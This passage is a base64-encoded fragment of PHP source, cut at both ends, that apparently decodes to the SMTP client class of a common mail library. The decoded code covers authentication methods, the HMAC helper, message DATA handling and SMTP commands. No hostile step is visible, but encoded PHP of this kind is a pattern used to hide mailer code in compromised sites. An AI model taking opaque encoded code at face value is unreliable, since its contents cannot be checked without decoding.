UJVR19MT1dMRVZFTCk7DQogICAgICAgICAgICBzZWxmOjplZGVidWcoJ0F1dGggbWV0aG9kcyBhdmFpbGFibGUgb24gdGhlIHNlcnZlcjogJyAuIGltcGxvZGUoJywnLCAkdGhpcy0+c2VydmVyX2NhcHNbJ0FVVEgnXSksIHNlbGY6OkRFQlVHX0xPV0xFVkVMKTsNCiAgICAgICAgICAgIGlmIChlbXB0eSgkYXV0aHR5cGUpKSB7DQogICAgICAgICAgICAgICAgZm9yZWFjaCAoYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICdDUkFNLU1ENScsDQogICAgICAgICAgICAgICAgICAgICdMT0dJTicsDQogICAgICAgICAgICAgICAgICAgICdQTEFJTicsDQogICAgICAgICAgICAgICAgICAgICdOVExNJywNCiAgICAgICAgICAgICAgICAgICAgJ1hPQVVUSDInDQogICAgICAgICAgICAgICAgKSBhcyAkbWV0aG9kKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChpbl9hcnJheSgkbWV0aG9kLCAkdGhpcy0+c2VydmVyX2NhcHNbJ0FVVEgnXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRhdXRodHlwZSA9ICRtZXRob2Q7DQogICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJGF1dGh0eXBlKSkgew0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ05vIHN1cHBvcnRlZCBhdXRoZW50aWNhdGlvbiBtZXRob2RzIGZvdW5kJyk7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc2VsZjo6ZWRlYnVnKCdBdXRoIG1ldGhvZCBzZWxlY3RlZDogJyAuICRhdXRodHlwZSwgc2VsZjo6REVCVUdfTE9XTEVWRUwpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCFpbl9hcnJheSgkYXV0aHR5cGUsICR0aGlzLT5zZXJ2ZXJfY2Fwc1snQVVUSCddKSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigiVGhlIHJlcXVlc3RlZCBhdXRoZW50aWNhdGlvbiBtZXRob2QgXCIkYXV0aHR5cGVcIiBpcyBub3Qgc3VwcG9ydGVkIGJ5IHRoZSBzZXJ2ZXIiKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZWlmIChlbXB0eSgkYXV0aHR5cGUpKSB7DQogICAgICAgICAgICAkYXV0aHR5cGUgPSAnTE9HSU4nOw0KICAgICAgICB9DQogICAgICAgIHN3aXRjaCAoJGF1dGh0eXBlKSB7DQogICAgICAgICAgICBjYXNlICdQTEFJTic6DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ0FVVEgnLCAnQVVUSCBQTEFJTicsIDMzNCkpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnVXNlciAmIFBhc3N3b3JkJywgYmFzZTY0X2VuY29kZSgiXDAiIC4gJHVzZXJuYW1lIC4gIlwwIiAuICRwYXNzd29yZCksIDIzNSkpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIGNhc2UgJ0xPR0lOJzoNCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT5zZW5kQ29tbWFuZCgnQVVUSCcsICdBVVRIIExPR0lOJywgMzM0KSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCJVc2VybmFtZSIsIGJhc2U2NF9lbmNvZGUoJHVzZXJuYW1lKSwgMzM0KSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCJQYXNzd29yZCIsIGJhc2U2NF9lbmNvZGUoJHBhc3N3b3JkKSwgMjM1KSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgY2FzZSAnWE9BVVRIMic6DQogICAgICAgICAgICAgICAgaWYgKGlzX251bGwoJE9BdXRoKSkgew0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRvYXV0aCA9ICRPQXV0aC0+Z2V0T2F1dGg2NCgpOw0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdBVVRIJywgJ0FVVEggWE9BVVRIMiAnIC4gJG9hdXRoLCAyMzUpKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICBjYXNlICdOVExNJzoNCiAgICAgICAgICAgICAgICAkdGVtcCAgICAgICAgPSBuZXcgc3RkQ2xhc3M7DQogICAgICAgICAgICAgICAgJG50bG1fY2xpZW50ID0gbmV3IG50bG1fc2FzbF9jbGllbnRfY2xhc3M7DQogICAgICAgICAgICAgICAgaWYgKCEkbnRsbV9jbGllbnQtPmluaXRpYWxpemUoJHRlbXApKSB7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGVtcC0+ZXJyb3IpOw0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCdZb3UgbmVlZCB0byBlbmFibGUgc29tZSBtb2R1bGVzIGluIHlvdXIgcGhwLmluaSBmaWxlOiAnIC4gJHRoaXMtPmVycm9yWydlcnJvciddLCBzZWxmOjpERUJVR19DTElFTlQpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICRtc2cxID0gJG50bG1fY2xpZW50LT50eXBlTXNnMSgkcmVhbG0sICR3b3Jrc3RhdGlvbik7DQogICAgICAgICAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ0FVVEggTlRMTScsICdBVVRIIE5UTE0gJyAuIGJhc2U2NF9lbmNvZGUoJG1zZzEpLCAzMzQpKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGNoYWxsZW5nZSA9IHN1YnN0cigkdGhpcy0+bGFzdF9yZXBseSwgMyk7DQogICAgICAgICAgICAgICAgJGNoYWxsZW5nZSA9IGJhc2U2NF9kZWNvZGUoJGNoYWxsZW5nZSk7DQogICAgICAgICAgICAgICAgJG50bG1fcmVzICA9ICRudGxtX2NsaWVudC0+TlRMTVJlc3BvbnNlKHN1YnN0cigkY2hhbGxlbmdlLCAyNCwgOCksICRwYXNzd29yZCk7DQogICAgICAgICAgICAgICAgJG1zZzMgICAgICA9ICRudGxtX2NsaWVudC0+dHlwZU1zZzMoJG50bG1fcmVzLCAkdXNlcm5hbWUsICRyZWFsbSwgJHdvcmtzdGF0aW9uKTsNCiAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdVc2VybmFtZScsIGJhc2U2NF9lbmNvZGUoJG1zZzMpLCAyMzUpOw0KICAgICAgICAgICAgY2FzZSAnQ1JBTS1NRDUnOg0KICAgICAgICAgICAgICAgIGlmICghJHRoaXMtPnNlbmRDb21tYW5kKCdBVVRIIENSQU0tTUQ1JywgJ0FVVEggQ1JBTS1NRDUnLCAzMzQpKSB7DQogICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJGNoYWxsZW5nZSA9IGJhc2U2NF9kZWNvZGUoc3Vic3RyKCR0aGlzLT5sYXN0X3JlcGx5LCA0KSk7DQogICAgICAgICAgICAgICAgJHJlc3BvbnNlICA9ICR1c2VybmFtZSAuICcgJyAuICR0aGlzLT5obWFjKCRjaGFsbGVuZ2UsICRwYXNzd29yZCk7DQogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnVXNlcm5hbWUnLCBiYXNlNjRfZW5jb2RlKCRyZXNwb25zZSksIDIzNSk7DQogICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigiQXV0aGVudGljYXRpb24gbWV0aG9kIFwiJGF1dGh0eXBlXCIgaXMgbm90IHN1cHBvcnRlZCIpOw0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcHJvdGVjdGVkIGZ1bmN0aW9uIGhtYWMoJGRhdGEsICRrZXkpIHsNCiAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygnaGFzaF9obWFjJykpIHsNCiAgICAgICAgICAgIHJldHVybiBoYXNoX2htYWMoJ21kNScsICRkYXRhLCAka2V5KTsNCiAgICAgICAgfQ0KICAgICAgICAkYnl0ZWxlbiA9IDY0Ow0KICAgICAgICBpZiAoc3RybGVuKCRrZXkpID4gJGJ5dGVsZW4pIHsNCiAgICAgICAgICAgICRrZXkgPSBwYWNrKCdIKicsIG1kNSgka2V5KSk7DQogICAgICAgIH0NCiAgICAgICAgJGtleSAgICA9IHN0cl9wYWQoJGtleSwgJGJ5dGVsZW4sIGNocigweDAwKSk7DQogICAgICAgICRpcGFkICAgPSBzdHJfcGFkKCcnLCAkYnl0ZWxlbiwgY2hyKDB4MzYpKTsNCiAgICAgICAgJG9wYWQgICA9IHN0cl9wYWQoJycsICRieXRlbGVuLCBjaHIoMHg1YykpOw0KICAgICAgICAka19pcGFkID0gJGtleSBeICRpcGFkOw0KICAgICAgICAka19vcGFkID0gJGtleSBeICRvcGFkOw0KICAgICAgICByZXR1cm4gbWQ1KCRrX29wYWQgLiBwYWNrKCdIKicsIG1kNSgka19pcGFkIC4gJGRhdGEpKSk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBjb25uZWN0ZWQoKSB7DQogICAgICAgIGlmIChpc19yZXNvdXJjZSgkdGhpcy0+c210cF9jb25uKSkgew0KICAgICAgICAgICAgJHNvY2tfc3RhdHVzID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJHRoaXMtPnNtdHBfY29ubik7DQogICAgICAgICAgICBpZiAoJHNvY2tfc3RhdHVzWydlb2YnXSkgew0KICAgICAgICAgICAgICAgICR0aGlzLT5lZGVidWcoJ1NNVFAgTk9USUNFOiBFT0YgY2F1Z2h0IHdoaWxlIGNoZWNraW5nIGlmIGNvbm5lY3RlZCcsIHNlbGY6OkRFQlVHX0NMSUVOVCk7DQogICAgICAgICAgICAgICAgJHRoaXMtPmNsb3NlKCk7DQogICAgICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xvc2UoKSB7DQogICAgICAgICR0aGlzLT5zZXRFcnJvcignJyk7DQogICAgICAgICR0aGlzLT5zZXJ2ZXJfY2FwcyA9IG51bGw7DQogICAgICAgICR0aGlzLT5oZWxvX3JwbHkgICA9IG51bGw7DQogICAgICAgIGlmIChpc19yZXNvdXJjZSgkdGhpcy0+c210cF9jb25uKSkgew0KICAgICAgICAgICAgZmNsb3NlKCR0aGlzLT5zbXRwX2Nvbm4pOw0KICAgICAgICAgICAgJHRoaXMtPnNtdHBfY29ubiA9IG51bGw7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCdDb25uZWN0aW9uOiBjbG9zZWQnLCBzZWxmOjpERUJVR19DT05ORUNUSU9OKTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZGF0YSgkbXNnX2RhdGEpIHsNCiAgICAgICAgaWYgKCEkdGhpcy0+c2VuZENvbW1hbmQoJ0RBVEEnLCAnREFUQScsIDM1NCkpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICAkbGluZXMgICAgICA9IGV4cGxvZGUoIlxuIiwgc3RyX3JlcGxhY2UoYXJyYXkoDQogICAgICAgICAgICAiXHJcbiIsDQogICAgICAgICAgICAiXHIiDQogICAgICAgICksICJcbiIsICRtc2dfZGF0YSkpOw0KICAgICAgICAkZmllbGQgICAgICA9IHN1YnN0cigkbGluZXNbMF0sIDAsIHN0cnBvcygkbGluZXNbMF0sICc6JykpOw0KICAgICAgICAkaW5faGVhZGVycyA9IGZhbHNlOw0KICAgICAgICBpZiAoIWVtcHR5KCRmaWVsZCkgJiYgc3RycG9zKCRmaWVsZCwgJyAnKSA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgICRpbl9oZWFkZXJzID0gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJGxpbmUpIHsNCiAgICAgICAgICAgICRsaW5lc19vdXQgPSBhcnJheSgpOw0KICAgICAgICAgICAgaWYgKCRpbl9oZWFkZXJzIGFuZCAkbGluZSA9PSAnJykgew0KICAgICAgICAgICAgICAgICRpbl9oZWFkZXJzID0gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICB3aGlsZSAoaXNzZXQoJGxpbmVbc2VsZjo6TUFYX0xJTkVfTEVOR1RIXSkpIHsNCiAgICAgICAgICAgICAgICAkcG9zID0gc3RycnBvcyhzdWJzdHIoJGxpbmUsIDAsIHNlbGY6Ok1BWF9MSU5FX0xFTkdUSCksICcgJyk7DQogICAgICAgICAgICAgICAgaWYgKCEkcG9zKSB7DQogICAgICAgICAgICAgICAgICAgICRwb3MgICAgICAgICA9IHNlbGY6Ok1BWF9MSU5FX0xFTkdUSCAtIDE7DQogICAgICAgICAgICAgICAgICAgICRsaW5lc19vdXRbXSA9IHN1YnN0cigkbGluZSwgMCwgJHBvcyk7DQogICAgICAgICAgICAgICAgICAgICRsaW5lICAgICAgICA9IHN1YnN0cigkbGluZSwgJHBvcyk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJGxpbmVzX291dFtdID0gc3Vic3RyKCRsaW5lLCAwLCAkcG9zKTsNCiAgICAgICAgICAgICAgICAgICAgJGxpbmUgICAgICAgID0gc3Vic3RyKCRsaW5lLCAkcG9zICsgMSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICgkaW5faGVhZGVycykgew0KICAgICAgICAgICAgICAgICAgICAkbGluZSA9ICJcdCIgLiAkbGluZTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkbGluZXNfb3V0W10gPSAkbGluZTsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRsaW5lc19vdXQgYXMgJGxpbmVfb3V0KSB7DQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGluZV9vdXQpIGFuZCAkbGluZV9vdXRbMF0gPT0gJy4nKSB7DQogICAgICAgICAgICAgICAgICAgICRsaW5lX291dCA9ICcuJyAuICRsaW5lX291dDsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHRoaXMtPmNsaWVudF9zZW5kKCRsaW5lX291dCAuIHNlbGY6OkNSTEYpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgICRzYXZldGltZWxpbWl0ICAgPSAkdGhpcy0+VGltZWxpbWl0Ow0KICAgICAgICAkdGhpcy0+VGltZWxpbWl0ID0gJHRoaXMtPlRpbWVsaW1pdCAqIDI7DQogICAgICAgICRyZXN1bHQgICAgICAgICAgPSAkdGhpcy0+c2VuZENvbW1hbmQoJ0RBVEEgRU5EJywgJy4nLCAyNTApOw0KICAgICAgICAkdGhpcy0+VGltZWxpbWl0ID0gJHNhdmV0aW1lbGltaXQ7DQogICAgICAgIHJldHVybiAkcmVzdWx0Ow0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gaGVsbG8oJGhvc3QgPSAnJykgew0KICAgICAgICByZXR1cm4gKGJvb2xlYW4pICgkdGhpcy0+c2VuZEhlbGxvKCdFSExPJywgJGhvc3QpIG9yICR0aGlzLT5zZW5kSGVsbG8oJ0hFTE8nLCAkaG9zdCkpOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2VuZEhlbGxvKCRoZWxsbywgJGhvc3QpIHsNCiAgICAgICAgJG5vZXJyb3IgICAgICAgICA9ICR0aGlzLT5zZW5kQ29tbWFuZCgkaGVsbG8sICRoZWxsbyAuICcgJyAuICRob3N0LCAyNTApOw0KICAgICAgICAkdGhpcy0+aGVsb19ycGx5ID0gJHRoaXMtPmxhc3RfcmVwbHk7DQogICAgICAgIGlmICgkbm9lcnJvcikgew0KICAgICAgICAgICAgJHRoaXMtPnBhcnNlSGVsbG9GaWVsZHMoJGhlbGxvKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXJ2ZXJfY2FwcyA9IG51bGw7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRub2Vycm9yOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gcGFyc2VIZWxsb0ZpZWxkcygkdHlwZSkgew0KICAgICAgICAkdGhpcy0+c2VydmVyX2NhcHMgPSBhcnJheSgpOw0KICAgICAgICAkbGluZXMgICAgICAgICAgICAgPSBleHBsb2RlKCJcbiIsICR0aGlzLT5oZWxvX3JwbHkpOw0KICAgICAgICBmb3JlYWNoICgkbGluZXMgYXMgJG4gPT4gJHMpIHsNCiAgICAgICAgICAgICRzID0gdHJpbShzdWJzdHIoJHMsIDQpKTsNCiAgICAgICAgICAgIGlmIChlbXB0eSgkcykpIHsNCiAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICRmaWVsZHMgPSBleHBsb2RlKCcgJywgJHMpOw0KICAgICAgICAgICAgaWYgKCFlbXB0eSgkZmllbGRzKSkgew0KICAgICAgICAgICAgICAgIGlmICghJG4pIHsNCiAgICAgICAgICAgICAgICAgICAgJG5hbWUgICA9ICR0eXBlOw0KICAgICAgICAgICAgICAgICAgICAkZmllbGRzID0gJGZpZWxkc1swXTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkbmFtZSA9IGFycmF5X3NoaWZ0KCRmaWVsZHMpOw0KICAgICAgICAgICAgICAgICAgICBzd2l0Y2ggKCRuYW1lKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICdTSVpFJzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZmllbGRzID0gKCRmaWVsZHMgPyAkZmllbGRzWzBdIDogMCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgICAgICAgICBjYXNlICdBVVRIJzoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIWlzX2FycmF5KCRmaWVsZHMpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRmaWVsZHMgPSBhcnJheSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJGZpZWxkcyA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgJHRoaXMtPnNlcnZlcl9jYXBzWyRuYW1lXSA9ICRmaWVsZHM7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIG1haWwoJGZyb20pIHsNCiAgICAgICAgJHVzZVZlcnAgPSAoJHRoaXMtPmRvX3ZlcnAgPyAnIFhWRVJQJyA6ICcnKTsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnTUFJTCBGUk9NJywgJ01BSUwgRlJPTTo8JyAuICRmcm9tIC4gJz4nIC4gJHVzZVZlcnAsIDI1MCk7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBxdWl0KCRjbG9zZV9vbl9lcnJvciA9IHRydWUpIHsNCiAgICAgICAgJG5vZXJyb3IgPSAkdGhpcy0+c2VuZENvbW1hbmQoJ1FVSVQnLCAnUVVJVCcsIDIyMSk7DQogICAgICAgICRlcnIgICAgID0gJHRoaXMtPmVycm9yOw0KICAgICAgICBpZiAoJG5vZXJyb3Igb3IgJGNsb3NlX29uX2Vycm9yKSB7DQogICAgICAgICAgICAkdGhpcy0+Y2xvc2UoKTsNCiAgICAgICAgICAgICR0aGlzLT5lcnJvciA9ICRlcnI7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRub2Vycm9yOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gcmVjaXBpZW50KCRhZGRyZXNzKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ1JDUFQgVE8nLCAnUkNQVCBUTzo8JyAuICRhZGRyZXNzIC4gJz4nLCBhcnJheSgNCiAgICAgICAgICAgIDI1MCwNCiAgICAgICAgICAgIDI1MQ0KICAgICAgICApKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHJlc2V0KCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRDb21tYW5kKCdSU0VUJywgJ1JTRVQnLCAyNTApOw0KICAgIH0NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2VuZENvbW1hbmQoJGNvbW1hbmQsICRjb21tYW5kc3RyaW5nLCAkZXhwZWN0KSB7DQogICAgICAgIGlmICghJHRoaXMtPmNvbm5lY3RlZCgpKSB7DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoIkNhbGxlZCAkY29tbWFuZCB3aXRob3V0IGJlaW5nIGNvbm5lY3RlZCIpOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgIGlmIChzdHJwb3MoJGNvbW1hbmRzdHJpbmcsICJcbiIpICE9PSBmYWxzZSBvciBzdHJwb3MoJGNvbW1hbmRzdHJpbmcsICJcciIpICE9PSBmYWxzZSkgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCJDb21tYW5kICckY29tbWFuZCcgY29udGFpbmVkIGxpbmUgYnJlYWtzIik7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmNsaWVudF9zZW5kKCRjb21tYW5kc3RyaW5nIC4gc2VsZjo6Q1JMRik7DQogICAgICAgICR0aGlzLT5sYXN0X3JlcGx5ID0gJHRoaXMtPmdldF9saW5lcygpOw0KICAgICAgICAkbWF0Y2hlcyAgICAgICAgICA9IGFycmF5KCk7DQogICAgICAgIGlmIChwcmVnX21hdGNoKCIvXihbMC05XXszfSlbIC1dKD86KFswLTldXFwuWzAtOV1cXC5bMC05XSkgKT8vIiwgJHRoaXMtPmxhc3RfcmVwbHksICRtYXRjaGVzKSkgew0KICAgICAgICAgICAgJGNvZGUgICAgPSAkbWF0Y2hlc1sxXTsNCiAgICAgICAgICAgICRjb2RlX2V4ID0gKGNvdW50KCRtYXRjaGVzKSA+IDIgPyAkbWF0Y2hlc1syXSA6IG51bGwpOw0KICAgICAgICAgICAgJGRldGFpbCAgPSBwcmVnX3JlcGxhY2UoIi97JGNvZGV9WyAtXSIgLiAoJGNvZGVfZXggPyBzdHJfcmVwbGFjZSgnLicsICdcXC4nLCAkY29kZV9leCkgLiAnICcgOiAnJykgLiAiL20iLCAnJywgJHRoaXMtPmxhc3RfcmVwbHkpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJGNvZGUgICAgPSBzdWJzdHIoJHRoaXMtPmxhc3RfcmVwbHksIDAsIDMpOw0KICAgICAgICAgICAgJGNvZGVfZXggPSBudWxsOw0KICAgICAgICAgICAgJGRldGFpbCAgPSBzdWJzdHIoJHRoaXMtPmxhc3RfcmVwbHksIDQpOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5lZGVidWcoJ1NFUlZFUiAtPiBDTElFTlQ6ICcgLiAkdGhpcy0+bGFzdF9yZXBseSwgc2VsZjo6REVCVUdfU0VSVkVSKTsNCiAgICAgICAgaWYgKCFpbl9hcnJheSgkY29kZSwgKGFycmF5KSAkZXhwZWN0KSkgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCIkY29tbWFuZCBjb21tYW5kIGZhaWxlZCIsICRkZXRhaWwsICRjb2RlLCAkY29kZV9leCk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCdTTVRQIEVSUk9SOiAnIC4gJHRoaXMtPmVycm9yWydlcnJvciddIC4gJzogJyAuICR0aGlzLT5sYXN0X3JlcGx5LCBzZWxmOjpERUJVR19DTElFTlQpOw0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5zZXRFcnJvcignJyk7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gc2VuZEFuZE1haWwoJGZyb20pIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnU0FNTCcsICJTQU1MIEZST006JGZyb20iLCAyNTApOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gdmVyaWZ5KCRuYW1lKSB7DQogICAgICAgIHJldHVybiAkdGhpcy0+c2VuZENvbW1hbmQoJ1ZSRlknLCAiVlJGWSAkbmFtZSIsIGFycmF5KA0KICAgICAgICAgICAgMjUwLA0KICAgICAgICAgICAgMjUxDQogICAgICAgICkpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gbm9vcCgpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZW5kQ29tbWFuZCgnTk9PUCcsICdOT09QJywgMjUwKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHR1cm4oKSB7DQogICAgICAgICR0aGlzLT5zZXRFcnJvcignVGhlIFNNVFAgVFVSTiBjb21tYW5kIGlzIG5vdCBpbXBsZW1lbnRlZCcpOw0KICAgICAgICAkdGhpcy0+ZWRlYnVnKCdTTVRQIE5PVElDRTogJyAuICR0aGlzLT5lcnJvclsnZXJyb3InXSwgc2VsZjo6REVCVUdfQ0xJRU5UKTsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xpZW50X3NlbmQoJGRhdGEpIHsNCiAgICAgICAgJHRoaXMtPmVkZWJ1ZygiQ0xJRU5UIC0+IFNFUlZFUjogJGRhdGEiLCBzZWxmOjpERUJVR19DTElFTlQpOw0KICAgICAgICByZXR1cm4gZndyaXRlKCR0aGlzLT5zbXRwX2Nvbm4sICRkYXRhKTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldEVycm9yKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmVycm9yOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0U2VydmVyRXh0TGlzdCgpIHsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5zZXJ2ZXJfY2FwczsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGdldFNlcnZlckV4dCgkbmFtZSkgew0KICAgICAgICBpZiAoISR0aGlzLT5zZXJ2ZXJfY2Fwcykgew0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCdObyBIRUxPL0VITE8gd2FzIHNlbnQnKTsNCiAgICAgICAgICAgIHJldHVybiBudWxsOw0KICAgICAgICB9DQogICAgICAgIGlmICghYXJyYXlfa2V5X2V4aXN0cygkbmFtZSwgJHRoaXMtPnNlcnZlcl9jYXBzKSkgew0KICAgICAgICAgICAgaWYgKCRuYW1lID09ICdIRUxPJykgew0KICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+c2VydmVyX2NhcHNbJ0VITE8nXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICgkbmFtZSA9PSAnRUhMTycgfHwgYXJyYXlfa2V5X2V4aXN0cygnRUhMTycsICR0aGlzLT5zZXJ2ZXJfY2FwcykpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJ0hFTE8gaGFuZHNoYWtlIHdhcyB1c2VkLiBDbGllbnQga25vd